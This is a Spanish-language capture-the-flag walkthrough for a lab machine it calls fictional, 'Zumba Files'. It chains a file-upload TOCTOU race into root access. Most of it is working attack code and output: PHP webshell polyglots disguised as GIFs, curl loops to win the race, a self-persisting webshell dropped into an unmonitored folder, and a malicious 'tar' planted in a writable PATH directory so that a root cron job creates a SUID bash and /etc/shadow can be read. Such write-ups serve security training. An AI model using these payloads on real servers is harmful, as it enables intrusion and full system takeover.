# TOCTOU — Zumba Files

**Dificultad:** Media · **Categoría:** Web

Zumba Files es una plataforma ficticia de subida rápida de archivos sin registro.
El servidor guarda cada archivo con su nombre y extensión originales en el webroot
y **solo después** lo analiza, borrándolo si detecta contenido peligroso. Entre el
guardado y el borrado existe una ventana de carrera (TOCTOU, CWE-367): subiendo un
PHP disfrazado de imagen y accediendo a él antes de que el análisis lo elimine se
consigue ejecución de código como `www-data`. El payload, al ejecutarse una sola
vez, deja caer una webshell persistente fuera de la carpeta vigilada, de modo que a
partir de ahí basta `curl` normal. Desde ahí, un cron de root que invoca `tar` sin
ruta absoluta con un directorio escribible al frente del `$PATH` permite escalar a
root.

## Objetivo

1. Enumerar la web y localizar el endpoint de subida y la carpeta de uploads.
2. Descubrir que la validación de contenido ocurre **después** de guardar el archivo.
3. Ganar la condición de carrera una vez para dejar una webshell persistente.
4. Enumerar el sistema y abusar de un cron de root con `$PATH` secuestrable.
5. Obtener root.

## Tipo de máquina

- **Plataforma:** Docker (DockerLabs)
- **SO:** Debian GNU/Linux 13 (trixie)
- **Categoría:** Web
- **Servicios:** Apache 2.4 + PHP (único puerto expuesto: 80)
- **Vector de entrada:** condición de carrera TOCTOU en la subida de archivos
- **Escalada:** secuestro de `$PATH` en un cron de root

## Instalación

Descomprime el ZIP y despliega con el script oficial:

```bash
unzip toctou.zip -d toctou && cd toctou
chmod +x auto_deploy.sh
./auto_deploy.sh toctou.tar
```

El script carga la imagen, arranca el contenedor y muestra su IP:

```
Máquina desplegada, su dirección IP es --> 172.17.0.2
```

En adelante se usa `172.17.0.2` como IP de la máquina.

## Escaneo de puertos

```bash
nmap -sV -p- -T4 172.17.0.2
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.69 ((Debian))
```

Solo hay un servicio web. Toda la superficie de ataque está en el puerto 80.

## Enumeración web

La aplicación es "Zumba Files", una web de subida de archivos sin registro. Tiene
tres páginas: la principal (`/`) con la caja de subida, `/archivos` con el listado
de lo subido y `/nosotros`.

```bash
curl -s http://172.17.0.2/ | grep -o '<title>.*</title>'
```

```
<title>Zumba Files — Envía archivos en segundos</title>
```

La página principal sube los archivos a `/upload.php` mediante un formulario
multipart (campo `file`). El JavaScript muestra una barra de progreso y, al terminar
la transferencia, un mensaje de **"Verificando… Analizando el archivo en busca de
contenido no permitido"**: hay un análisis que introduce un retraso. Tras subir, el
archivo queda accesible en `/uploads/<nombre>` y aparece listado en `/archivos`.

Probamos primero una imagen legítima:

```bash
printf '\x89PNG\x0d\x0a\x1a\x0afoobar' > real.png
curl -s -F "file=@real.png;type=image/png" http://172.17.0.2/upload.php
```

```json
{"ok":true,"url":"\/uploads\/real.png"}
```

Ahora un PHP plano:

```bash
printf '<?php system($_GET["cmd"]); ?>' > plain.php
curl -s -F "file=@plain.php;type=image/png" http://172.17.0.2/upload.php
```

```json
{"ok":false,"error":"Solo se permiten imágenes (PNG, JPG, GIF o BMP)."}
```

La respuesta es **inmediata**: existe una comprobación rápida de cabecera por *magic
bytes* que rechaza lo que no empieza por una firma de imagen (PNG, JPG, GIF, BMP).
Esta comprobación no mira la extensión del archivo, solo los primeros bytes.

## La condición de carrera (TOCTOU)

El truco es un *polyglot*: un archivo que empieza con la firma `GIF89a` (para pasar
la comprobación de cabecera) pero cuyo nombre acaba en `.php` y contiene código PHP.
El texto previo a `<?php` se emite como salida inocua y no impide la ejecución.

```bash
printf 'GIF89a;\n<?php system($_GET["cmd"]); ?>\n' > test.php
curl -s -F "file=@test.php;type=image/gif" http://172.17.0.2/upload.php
```

Tras **~3 segundos** de espera:

```json
{"ok":false,"error":"El análisis detectó contenido potencialmente peligroso. Archivo rechazado."}
```

Es decir: la cabecera `GIF89a` pasa el primer filtro, el archivo **se guarda** en
`/uploads/test.php`, y solo **después** el análisis profundo detecta el `<?php` y lo
**borra**. Ese retraso de ~3 s es la ventana TOCTOU.

Clave del vector: la petición de subida **no responde hasta que el análisis termina**
(y para entonces el archivo ya ha sido borrado). Por tanto, subir y *luego* acceder
siempre llega tarde. Hay que **solapar** el acceso con la subida todavía en vuelo:
mientras una subida está "verificando", el PHP existe en `/uploads/` y es ejecutable.

### El payload: una webshell que se persiste a sí misma

El análisis solo vigila la carpeta `/uploads/`. En cambio, el webroot tiene una
carpeta `/.cache/` escribible por el usuario web que el análisis **no** revisa. La
idea es que nuestro polyglot, al ejecutarse **una sola vez** durante la ventana,
escriba una segunda webshell en `/.cache/` que ya no se borrará nunca:

```php
GIF89a;
<?php file_put_contents('/var/www/html/.cache/x.php','<?php if(!empty($_GET["cmd"])) system($_GET["cmd"]); ?>'); ?>
```

Guardamos ese contenido como `shell.php`:

```bash
cat > shell.php <<'EOF'
GIF89a;
<?php file_put_contents('/var/www/html/.cache/x.php','<?php if(!empty($_GET["cmd"])) system($_GET["cmd"]); ?>'); ?>
EOF
```

### Ganando la carrera con dos terminales

Con la ventana de ~3 s basta un bucle `curl` simple en cada una de dos terminales:
una sube el polyglot sin parar y la otra lo accede sin parar. No hace falta ffuf ni
guardar ningún script.

```bash
# Terminal 1 — subir el polyglot en bucle
while true; do curl -s -F "file=@shell.php;type=image/gif" http://172.17.0.2/upload.php >/dev/null; done
```

```bash
# Terminal 2 — acceder al archivo en bucle (al ejecutarse, deja caer /.cache/x.php)
while true; do curl -s http://172.17.0.2/uploads/shell.php >/dev/null; done
```

En un par de segundos uno de los accesos de la Terminal 2 cae dentro de la ventana y
ejecuta el polyglot, que escribe la webshell persistente. Paramos ambos bucles
(Ctrl+C) y comprobamos:

```bash
curl -s "http://172.17.0.2/.cache/x.php?cmd=id"
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Tenemos **RCE persistente como `www-data`**. A partir de aquí ya no hace falta volver
a ganar la carrera: `/.cache/x.php` no está en la carpeta vigilada y no se borra, así
que todo se hace con `curl` normal.

```bash
curl -s "http://172.17.0.2/.cache/x.php?cmd=uname%20-a"
```

```
Linux e5e9401f741c 6.12.41+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.41-1 x86_64 GNU/Linux
```

## Escalada de privilegios

Usamos `curl -G --data-urlencode` para pasar comandos con espacios cómodamente.
Enumeramos tareas programadas:

```bash
curl -s -G "http://172.17.0.2/.cache/x.php" --data-urlencode 'cmd=cat /etc/cron.d/zumba-backup'
```

```
# Copia de seguridad de las subidas de Zumba Files (cada minuto)
* * * * * root /opt/zumba/backup.sh >/dev/null 2>&1
```

Un cron ejecuta `/opt/zumba/backup.sh` **como root** cada minuto. Vemos el script:

```bash
curl -s -G "http://172.17.0.2/.cache/x.php" --data-urlencode 'cmd=cat /opt/zumba/backup.sh'
```

```bash
#!/bin/bash
# ...
# NOTA del equipo: cargamos nuestro directorio de utilidades propio delante
# del PATH para poder usar versiones "tuneadas" de las herramientas de backup.
export PATH=/opt/zumba/bin:$PATH

STAMP=$(date +%Y%m%d-%H%M%S)
cd /var/www/html/uploads || exit 0
tar -czf "/var/backups/uploads-${STAMP}.tar.gz" . 2>/dev/null
```

Dos problemas combinados:

1. El script antepone `/opt/zumba/bin` al `$PATH`.
2. Invoca `tar` **sin ruta absoluta**, así que se resolverá primero en `/opt/zumba/bin`.

¿Podemos escribir en ese directorio?

```bash
curl -s -G "http://172.17.0.2/.cache/x.php" --data-urlencode 'cmd=ls -la /opt/zumba'
```

```
drwxr-xr-x 1 root     root     4096 ... .
-rwxr-xr-x 1 root     root      755 ... backup.sh
drwxrwxr-x 1 www-data www-data 4096 ... bin
```

`/opt/zumba/bin` pertenece a `www-data` y es escribible. Plantamos ahí un `tar`
malicioso que crea una copia de `bash` con SUID root:

```bash
curl -s -G "http://172.17.0.2/.cache/x.php" --data-urlencode \
  'cmd=printf "#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\n" > /opt/zumba/bin/tar; chmod +x /opt/zumba/bin/tar; echo COLOCADO'
```

```
COLOCADO
```

Esperamos a que el cron se dispare (máximo 1 minuto) y comprobamos que aparece el
binario con SUID:

```bash
curl -s -G "http://172.17.0.2/.cache/x.php" --data-urlencode 'cmd=ls -la /tmp/rootbash'
```

```
-rwsr-xr-x 1 root root 1298416 ... /tmp/rootbash
```

El cron ha ejecutado nuestro `tar` como root y ha creado un `bash` SUID root. Ya solo
queda invocarlo preservando privilegios (`-p`):

```bash
curl -s -G "http://172.17.0.2/.cache/x.php" --data-urlencode \
  'cmd=/tmp/rootbash -p -c "id; cat /etc/shadow | head -1"'
```

```
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
root:*:20746:0:99999:7:::
```

`euid=0(root)` y lectura de `/etc/shadow`: **somos root**. Máquina comprometida.

## Resumen de la cadena

1. **Enumeración:** web de subida con validación de contenido diferida.
2. **TOCTOU:** polyglot `GIF89a` + `.php` que pasa el filtro de cabecera; accediendo
   de forma concurrente durante la ventana de ~3 s (dos bucles `curl`) se ejecuta una
   vez y deja una webshell persistente en `/.cache/` (fuera de la zona vigilada) →
   **RCE como www-data**.
3. **PrivEsc:** cron de root que llama a `tar` sin ruta absoluta con `/opt/zumba/bin`
   (escribible por www-data) al frente del `$PATH` → `tar` malicioso → **root**.
